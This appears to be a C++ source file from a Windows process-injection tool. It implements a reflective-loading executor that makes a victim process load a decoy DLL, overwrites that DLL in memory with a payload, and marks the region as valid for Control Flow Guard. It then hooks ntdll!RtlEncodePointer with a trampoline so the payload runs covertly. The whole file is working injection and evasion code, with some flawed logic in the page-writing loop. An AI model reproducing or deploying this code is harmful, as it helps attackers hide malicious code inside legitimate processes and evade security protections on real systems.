#include "executors/reflective_hooker.h"
#include "util.h"
#include <Psapi.h>
#include <libloaderapi.h>
#include <memoryapi.h>
#include <processthreadsapi.h>
#include <string.h>
#include <windows.h>
#include <winnt.h>
#define HOOK_SIZE 12

#ifdef DEBUG
#include <errhandlingapi.h>
#include <iostream>
#endif

ReflectiveHooker::ReflectiveHooker(const char *module_to_stomp) {
  this->module_to_stomp = module_to_stomp;
}

ReflectiveHooker::~ReflectiveHooker() {}

DWORD_PTR ReflectiveHooker::load_module(MemoryWriter *mw) {
  if (this->module_to_stomp == NULL) {
#ifdef DEBUG
    printf("No module to stomp found\n");
#endif
    return NULL;
  }

  LPTHREAD_START_ROUTINE load_library_address =
      (LPTHREAD_START_ROUTINE)GetProcAddress(
          GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");

  DWORD_PTR addr =
      mw->write((LPVOID)this->module_to_stomp, strlen(this->module_to_stomp),
                NULL, PAGE_READWRITE);
  HANDLE new_thread_address =
      CreateRemoteThread(mw->get_target_process(), NULL, 0,
                         load_library_address, (LPVOID)addr, 0, NULL);

  if (new_thread_address == NULL) {
#ifdef DEBUG
    printf("Failed to load module to stomp: %d\n", GetLastError());
#endif
    return NULL;
  }
  // we could get exit code of this thread to get HMODULE, but HMODULE is 64-bit
  // but GetExitCodeThread() only gives us a 32-bit value. Most of the time this
  // is fine, but it's not very robust, so instead we iterate over all of the
  // process' modules until we find the one we're looking for
  WaitForSingleObject(new_thread_address, INFINITE);

  char full_module_name[200];
  HMODULE module =
      get_remote_module(mw->get_target_process(), this->module_to_stomp);

  if (module == NULL) {
#ifdef DEBUG
    printf("Failed to load module to stomp in target_process. Did you use a "
           "full path to the module? %d\n",
           GetLastError());
#endif
    return NULL;
  }
  return (DWORD_PTR)module;
}

BOOL ReflectiveHooker::execute(MemoryWriter *mw, LPVOID data_to_write,
                               DWORD data_size) {

  // first: need to find memory address function to hook
  // we need to do this so we can write the address to our to-be-injected dll
  // we then write the original unhooked instructions
  const char *target_module_name = "C:\\Windows\\System32\\ntdll.dll";
  const char *target_function_name = "RtlEncodePointer";
  DWORD_PTR func_addr = get_remote_proc_address(
      mw->get_target_process(), target_module_name, target_function_name);

  if (func_addr == NULL) {
#ifdef DEBUG
    printf("Unable to find function %s in module %s\n", target_function_name,
           target_module_name);
#endif
    return FALSE;
  }

  // now map sections
  std::pair<LPVOID, SIZE_T> result =
      load_sections((DWORD_PTR)data_to_write, data_size);
  data_to_write = result.first;
  data_size = result.second;

  // now we write the address and bytes to the DOS header
  // we need to keep the first two bytes ("MZ") because the loader uses
  // them to locate itself in memory

  // we write:
  // func_addr length_of_hook unhooking_code

  // write func_addr
  memcpy((char *)data_to_write + 2, &func_addr, sizeof(func_addr));

  // write length of hook
  *((char *)data_to_write + 2 + sizeof(func_addr)) = (char)HOOK_SIZE;

  // write unhooking code by reading current bytes of function
  ReadProcessMemory(mw->get_target_process(), (LPCVOID)func_addr,
                    (char *)data_to_write + 3 + sizeof(func_addr), HOOK_SIZE,
                    NULL);

  // now we write the DLL to the target process
  // check if module stomping
  DWORD_PTR addr_to_write;
  if (this->module_to_stomp != NULL) {
    addr_to_write = this->load_module(mw);
    if (addr_to_write == NULL) {
#ifdef DEBUG
      printf("Failed to load module to stomp: %d\n", GetLastError());
      return FALSE;
#endif
    }
  } else {
    addr_to_write = NULL;
  }

  DWORD_PTR dll_addr;
  // If we're module stomping, we need to make the module RW, then we write,
  // then restore
  if (this->module_to_stomp != NULL) {
    DWORD old_protections;
    // write a page at atime so we have full granularity over permissions
    for (unsigned int offset = 0; offset + 0x1000 < data_size; offset++) {
      if (VirtualProtectEx(mw->get_target_process(),
                           (LPVOID)(addr_to_write + offset), 0x1000,
                           PAGE_READWRITE, &old_protections) == 0) {
#ifdef DEBUG
        printf("Failed to make module to stomp writable: %d\n", GetLastError());
#endif
        return FALSE;
      }
      // permissions are ignored if we specify an address
      if (mw->write((LPVOID)((DWORD_PTR)data_to_write + offset), 0x1000,
                    addr_to_write + offset, NULL) == NULL) {
#ifdef DEBUG
        printf("Failed to write to module to stomp: %d\n", GetLastError());
#endif
        return FALSE;
      }
      if (VirtualProtectEx(mw->get_target_process(),
                           (LPVOID)(addr_to_write + offset), 0x1000,
                           old_protections, &old_protections) == 0) {
#ifdef DEBUG
        printf("Failed to restore permissions to stomped module: %d\n",
               GetLastError());
#endif
        return FALSE;
      }
      // finally, since the .text sections might not line up, we need to restore
      // X permissions to the .text section of _our_ DLL
      // A better way to do this might be to load the sections of our DLL
      // replace the sections of the target DLL and adjust all the section
      // headers
      // this is badly written code, this should probably be redone

      DWORD_PTR start_addr = (DWORD_PTR)data_to_write;

      PIMAGE_NT_HEADERS pe_headers = (PIMAGE_NT_HEADERS)(
          ((PIMAGE_DOS_HEADER)start_addr)->e_lfanew + start_addr);

      // COFF header is 4 bytes after pe headers (just skips signature)

      DWORD number_of_sections =
          ((PIMAGE_FILE_HEADER)((DWORD_PTR)pe_headers + 0x4))->NumberOfSections;
      // section table starts right after optional header
      PIMAGE_SECTION_HEADER section_table = (PIMAGE_SECTION_HEADER)(
          (DWORD_PTR)&pe_headers->OptionalHeader +
          (DWORD_PTR)((PIMAGE_FILE_HEADER)((DWORD_PTR)pe_headers + 0x4))
              ->SizeOfOptionalHeader);
      for (int ii = 0; ii < number_of_sections; ii++) {
        if (strcmp((char *)section_table->Name, ".text") == 0) {
          VirtualProtectEx(
              mw->get_target_process(),
              (LPVOID)(section_table->VirtualAddress + addr_to_write),
              section_table->Misc.VirtualSize, PAGE_EXECUTE_READ,
              &old_protections);
        } else {
          VirtualProtectEx(
              mw->get_target_process(),
              (LPVOID)(section_table->VirtualAddress + addr_to_write),
              section_table->Misc.VirtualSize, PAGE_READWRITE,
              &old_protections);
        }
        section_table++;
      }
    }
    dll_addr = addr_to_write;
  } else {

    dll_addr = mw->write(data_to_write, data_size, addr_to_write,
                         PAGE_EXECUTE_READWRITE);
    if (dll_addr == NULL) {
#ifdef DEBUG
      std::cout << "Failed to write DLL data" << std::endl;
#endif
      return FALSE;
    }
  }

  // if we are module stomping, set the target module to be CFG valid
  if (this->module_to_stomp != NULL) {

    // setting entire module to be cfg valid, this is quite suspicious ngl
    BOOL(*SetProcessValidCallTargets_ptr)
    (HANDLE, PVOID, SIZE_T, ULONG, PCFG_CALL_TARGET_INFO) =
        (BOOL(*)(HANDLE, PVOID, SIZE_T, ULONG, PCFG_CALL_TARGET_INFO))
            GetProcAddress(GetModuleHandleA("kernelbase.dll"),
                           "SetProcessValidCallTargets");
    MEMORY_BASIC_INFORMATION mbi;
    CFG_CALL_TARGET_INFO ccti;
    ccti.Flags = CFG_CALL_TARGET_VALID;

    for (unsigned int ii = 0; ii < data_size; ii += 16) {
      ccti.Offset = ii;
      if (!(*SetProcessValidCallTargets_ptr)(mw->get_target_process(),
                                             (PVOID)addr_to_write, data_size, 1,
                                             &ccti)) {
#ifdef DEBUG
        printf("Failed to make module to stomp CFG valid: %d\n",
               GetLastError());
#endif
        return FALSE;
      }
    }
  }

  // now we get a pointer to reflective_load_unhook
  // to do this, we locate the export directory in the dll bytes and
  // get the offset to reflective_load_unhook from the base

  // could probably use get_remote_proc_address() here, but not sure
  // what target_module_name should be...

  DWORD_PTR start_addr = (DWORD_PTR)data_to_write;

  PIMAGE_NT_HEADERS pe_headers = (PIMAGE_NT_HEADERS)(
      ((PIMAGE_DOS_HEADER)start_addr)->e_lfanew + start_addr);

  PIMAGE_DATA_DIRECTORY export_directory = &(
      (pe_headers->OptionalHeader.DataDirectory)[IMAGE_DIRECTORY_ENTRY_EXPORT]);

  PIMAGE_EXPORT_DIRECTORY export_table =
      (PIMAGE_EXPORT_DIRECTORY)(export_directory->VirtualAddress + start_addr);

  LPDWORD address_table =
      (LPDWORD)(start_addr + export_table->AddressOfFunctions);
  LPDWORD name_pointer_table =
      (LPDWORD)(start_addr + export_table->AddressOfNames);
  LPWORD ordinal_table =
      (LPWORD)(start_addr + export_table->AddressOfNameOrdinals);

  DWORD_PTR reflective_load_offset;

  // iterate over all the exports until we find reflective_load_unhook
  for (unsigned int ii = 0; ii < export_table->NumberOfNames; ii++) {
    if (strcmp("reflective_load_unhook",
               (char *)(start_addr + *name_pointer_table)) == 0) {
      reflective_load_offset = (DWORD_PTR)(address_table[*ordinal_table]);
      break;
    }
    name_pointer_table++;
    ordinal_table++;
  }

  if (reflective_load_offset == NULL) {
#ifdef DEBUG
    std::cerr
        << "Unable to locate reflective_load_unhook export in the DLL. Did you "
           "make sure to compile the DLL with reflective_loader.c?"
        << std::endl;
#endif
    return FALSE;
  }

  DWORD_PTR reflective_load_ptr = reflective_load_offset + (DWORD_PTR)dll_addr;

  // now we hook a function
  // basically, replace first 6 bytes with push reflective_load_unhook; ret
  // wait for function to be triggered
  // reflective_load_unhook runs, then replaces 6 bytes with old definition
  // this is not that stable, and it's hard to change the function being hooked
  // could potentially improve by changing dll buffer on the fly

  // in this case, we hook ntdll!RtlEncodePointer

  /*
  hook is:
  mov rax, reflective_load_ptr
  push rax
  ret
  */
  char hook[HOOK_SIZE];
  hook[0] = 0x48;
  hook[1] = 0xb8;
  memcpy(hook + 2, &reflective_load_ptr, 8);
  hook[10] = 0x50;
  hook[11] = 0xc3;

  // use mw->write, defaulting to wpm if mw does not have control of address
  if (mw->has_address_control()) {
    if (mw->write(hook, sizeof(hook), func_addr, NULL) == NULL) {
#ifdef DEBUG
      printf("Failed to hook %s!%s: %d\n", target_module_name,
             target_function_name, GetLastError());
#endif
      return FALSE;
    }
  } else {
#ifdef DEBUG
    printf("Selected memory writer does not have address control and thus is "
           "partially incompatible with reflective hooking. Defaulted to "
           "WriteProcessMemory for writing hook\n");
#endif
    if (WriteProcessMemory(mw->get_target_process(), (LPVOID)func_addr, hook,
                           sizeof(hook), NULL) == 0) {
#ifdef DEBUG
      printf("Failed to hook %s!%s: %d\n", target_module_name,
             target_function_name, GetLastError());
#endif
      return FALSE;
    }
  }

#ifdef DEBUG
  printf("Payload written to %p\nReflective load at %p\n", dll_addr,
         reflective_load_ptr);
  printf("Hooked %s!%s\n", target_module_name, target_function_name);
#endif
  return TRUE;
}
